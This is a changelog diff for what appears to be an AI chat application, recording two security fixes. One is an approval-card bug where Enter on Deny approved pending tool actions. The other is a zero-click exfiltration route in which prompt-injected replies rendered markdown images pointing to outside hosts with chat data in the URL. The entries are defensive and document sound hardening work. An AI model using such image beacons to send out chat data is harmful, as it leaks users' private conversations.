@@ -101,6 +101,11 @@
 
 ### Security
 
+- **Pressing Enter on the approval card's Deny button denies.** While a tool approval was pending, Enter on any focused
+  control outside a text field ran "Allow once": Enter on **Deny**, **Allow session** or **Always allow** approved the
+  command once, and Enter on the ⋮ menu, a menu row, the project picker or a control that closes itself on Enter approved
+  the pending action instead of doing its own job. Enter now approves only when it isn't pressed on a control, so each
+  button does what it says. Enter with nothing focused still means Allow once. (#8131, #8130)
 - **Remote images in chat no longer load until you click them (zero-click exfiltration fix).** Any assistant-rendered
   `![x](https://host/?d=…)` used to fetch the moment it rendered, which let a prompt-injected reply beacon chat data to
   an outside server. The default CSP `img-src` no longer allows arbitrary `https:` images, and a non-allowlisted remote
